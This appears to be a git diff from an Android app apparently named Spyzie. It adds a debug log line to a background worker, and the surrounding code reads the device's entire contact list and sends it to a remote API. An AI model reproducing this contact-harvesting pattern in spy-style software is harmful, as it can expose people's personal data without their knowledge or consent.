@@ -4,6 +4,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.provider.ContactsContract;
+import android.util.Log;
 
 import androidx.annotation.NonNull;
 import androidx.work.Worker;
@@ -14,6 +15,7 @@ import com.tantd.spyzie.data.model.Contact;
 import com.tantd.spyzie.data.model.Error;
 import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.util.CommonUtils;
+import com.tantd.spyzie.util.Constants;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -38,6 +40,8 @@ public class GetContactsWorker extends Worker {
     @Override
     public Result doWork() {
         SpyzieApplication.getInstance().getServiceComponent().inject(this);
+
+        Log.d(Constants.LOG_TAG + "G", "GetContactsWorkder, instance=" + this);
 
         if (CommonUtils.hasContactPermission(getApplicationContext())) {
             mApiManager.sendContactsData(getAllContacts());
